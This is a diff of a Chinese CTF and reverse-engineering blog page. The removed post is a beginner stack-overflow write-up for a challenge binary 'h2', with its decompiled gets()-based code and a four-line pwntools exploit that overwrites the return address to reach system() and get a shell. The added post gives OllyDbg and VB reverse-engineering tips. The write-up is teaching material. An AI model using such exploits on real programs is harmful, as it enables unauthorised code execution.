@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="pwn入门,">
+  <meta name="keywords" content="逆向工程,">
 
 
 
@@ -79,18 +79,20 @@
 
 
 
-<meta name="description" content="首先我们先介绍一下栈溢出的基本原理：     栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变(下面我会用一个例题详细解释)。  PS：这一次比赛中遇到的简单题目，也是我做出来的第一个pwn 废话不多说，拿到一个名为h2的题目，用ida打开（我们通过F5可以看到题目的伪代码） int __cdecl main(int argc,">
-<meta name="keywords" content="pwn入门">
+<meta name="description" content="在VB中：vbaVarForInit() , vbaVarForNext() 可以使逆向分析人员在字符串对象中逐个引用字符。 后面可以跟loop count (EBX) 使其按指定次数运转循环 入口点：    调试器载入程序后停止的地方为入口点，它是一段EP（EntryPoint，入口点）代码，其中最引人注意的是CALL 和 JMP 两个命令    EP:    EP是windows可执行文件（E">
+<meta name="keywords" content="逆向工程">
 <meta property="og:type" content="article">
-<meta property="og:title" content="linux-栈溢出-无保护">
-<meta property="og:url" content="http://yoursite.com/2019/04/06/linux-栈溢出-无保护/index.html">
+<meta property="og:title" content="逆向小知识总结">
+<meta property="og:url" content="http://yoursite.com/2019/04/27/逆向小知识总结/index.html">
 <meta property="og:site_name" content="时钟">
-<meta property="og:description" content="首先我们先介绍一下栈溢出的基本原理：     栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变(下面我会用一个例题详细解释)。  PS：这一次比赛中遇到的简单题目，也是我做出来的第一个pwn 废话不多说，拿到一个名为h2的题目，用ida打开（我们通过F5可以看到题目的伪代码） int __cdecl main(int argc,">
+<meta property="og:description" content="在VB中：vbaVarForInit() , vbaVarForNext() 可以使逆向分析人员在字符串对象中逐个引用字符。 后面可以跟loop count (EBX) 使其按指定次数运转循环 入口点：    调试器载入程序后停止的地方为入口点，它是一段EP（EntryPoint，入口点）代码，其中最引人注意的是CALL 和 JMP 两个命令    EP:    EP是windows可执行文件（E">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-04-13T10:40:49.534Z">
+<meta property="og:image" content="http://yoursite.com/2019/04/27/逆向小知识总结/1.png">
+<meta property="og:updated_time" content="2019-04-27T10:24:44.402Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="linux-栈溢出-无保护">
-<meta name="twitter:description" content="首先我们先介绍一下栈溢出的基本原理：     栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变(下面我会用一个例题详细解释)。  PS：这一次比赛中遇到的简单题目，也是我做出来的第一个pwn 废话不多说，拿到一个名为h2的题目，用ida打开（我们通过F5可以看到题目的伪代码） int __cdecl main(int argc,">
+<meta name="twitter:title" content="逆向小知识总结">
+<meta name="twitter:description" content="在VB中：vbaVarForInit() , vbaVarForNext() 可以使逆向分析人员在字符串对象中逐个引用字符。 后面可以跟loop count (EBX) 使其按指定次数运转循环 入口点：    调试器载入程序后停止的地方为入口点，它是一段EP（EntryPoint，入口点）代码，其中最引人注意的是CALL 和 JMP 两个命令    EP:    EP是windows可执行文件（E">
+<meta name="twitter:image" content="http://yoursite.com/2019/04/27/逆向小知识总结/1.png">
 
 
 
@@ -120,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/04/06/linux-栈溢出-无保护/">
+  <link rel="canonical" href="http://yoursite.com/2019/04/27/逆向小知识总结/">
 
 
 
 
 
-  <title>linux-栈溢出-无保护 | 时钟</title>
+  <title>逆向小知识总结 | 时钟</title>
   
 
 
@@ -233,7 +235,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/06/linux-栈溢出-无保护/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/27/逆向小知识总结/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="时钟">
@@ -250,7 +252,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">linux-栈溢出-无保护</h1>
+          <h1 class="post-title" itemprop="name headline">逆向小知识总结</h1>
         
 
         <div class="post-meta">
@@ -262,8 +264,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-06T23:21:40+08:00">
-                2019-04-06
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-27T18:22:06+08:00">
+                2019-04-27
               </time>
             
 
@@ -285,8 +287,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWM/" itemprop="url" rel="index">
-                    <span itemprop="name">PWM</span>
+                  <a href="/categories/逆向工程/" itemprop="url" rel="index">
+                    <span itemprop="name">逆向工程</span>
                   </a>
                 </span>
 
@@ -327,15 +329,11 @@
       
 
       
-        <pre><code>首先我们先介绍一下栈溢出的基本原理：
-    栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变(下面我会用一个例题详细解释)。
-
-PS：这一次比赛中遇到的简单题目，也是我做出来的第一个pwn
-废话不多说，拿到一个名为h2的题目，用ida打开（我们通过F5可以看到题目的伪代码）
-int __cdecl main(int argc, const char **argv, const char **envp)
-</code></pre><p>{<br>  char s; // [rsp+0h] [rbp-80h]</p>
-<p>  puts(“Hello world!”);<br>  puts(“WHO ARE YOU:”);<br>  gets(&amp;s, argv);<br>  printf(“HELLO “);<br>  puts(&amp;s);<br>  return 0;<br>}<br>  （此为F5中的伪代码，非常简单）<br>    get函数是一个危险函数，当终端的输入量过大的时候，就会造成栈溢出，同时我们在ida左侧的Functions window下面看到了system函数，<br>    有基础的人看到这里，一定觉得题目也过于简单了吧，竟然留后门，但是这个题目可以帮助小白们很好的理解栈溢出原理和它的可怕之处。<br>    system():<br>    _system    .plt    00000000004004B0    00000006            R    .    .    .    .    T    .<br>    有了system的地址，我们只需要让程序执行它就可以了，在linux系统中运行h2，gdb测量一下就知道栈空间大小为136，<br>    那么我们就写exp了吧：<br>    {<br>        from pwn import <em><br>        sh = process(“h2”)<br>        sh.sendline(“a”</em>136+p64(0x4005f6))<br>        sh.interactive()<br>    }（就是这简单，四行代码getshell）</p>
-<p>说明： 如果想要试试的话可以到我的github上下载题目 <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:shizhongpwn/pwnstudy.git</p>
+        <p>在VB中：<br><strong>vbaVarForInit() , </strong>vbaVarForNext() 可以使逆向分析人员在字符串对象中逐个引用字符。 后面可以跟loop count (EBX) 使其按指定次数运转循环</p>
+<p>入口点：<br>    调试器载入程序后停止的地方为入口点，它是一段EP（EntryPoint，入口点）代码，其中最引人注意的是CALL 和 JMP 两个命令<br>    <img src="/2019/04/27/逆向小知识总结/1.png" title="This is an image"><br>EP:<br>    EP是windows可执行文件（EXE,DLL,SYS等）的代码入口点，是执行应用程序时最先执行的代码的起始位置，它依赖于CPU</p>
+<p>查找main函数的方法：<br>    简单有效：F7,F8查看函数 （一些经验就是可以通过注释区的注释直接步过一些函数列如一些winAPI）</p>
+<p>大本营：<br>    为了重复加载程序方便，我们可以在一些地方下断点防止一些麻烦（就比如不用一次次的找main函数）<br>    1.GOTO 命令（Ctrl+G）然后 F4<br>    2.设置断点<br>    3.加上注释（快捷键 ; ）<br>    4.加上标签 （快捷键 : ）</p>
+<p>快速查找指定代码的四种方法：<br>    1.代码执行法<br>    2.字符串检索法<br>    3.API检索法（1）：程序没有压缩器/保护器的保护  用All intermodular calls 生成API函数列表<br>    3.API检索法（2）：存在（1）中情况   此时DLL代码库被加载到内存后，我们可以直接向DLL库中添加断点 （快捷键Alt + M 打开内存映射窗口可以查看一些进程内存和USER32库的加载情况），同时 Name in all modules可以列出所被加载的DLL文件中提供的API</p>
 
       
     </div>
@@ -353,7 +351,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
       
         <div class="post-tags">
           
-            <a href="/tags/pwn入门/" rel="tag"># pwn入门</a>
+            <a href="/tags/逆向工程/" rel="tag"># 逆向工程</a>
           
         </div>
       
@@ -366,15 +364,15 @@ int __cdecl main(int argc, const char **argv, const char **envp)
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2019/04/24/特别讨厌的ecx-4/" rel="next" title="特别讨厌的ecx-4">
+                <i class="fa fa-chevron-left"></i> 特别讨厌的ecx-4
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/04/13/通过esp扩大栈空间/" rel="prev" title="通过esp扩大栈空间">
-                通过esp扩大栈空间 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
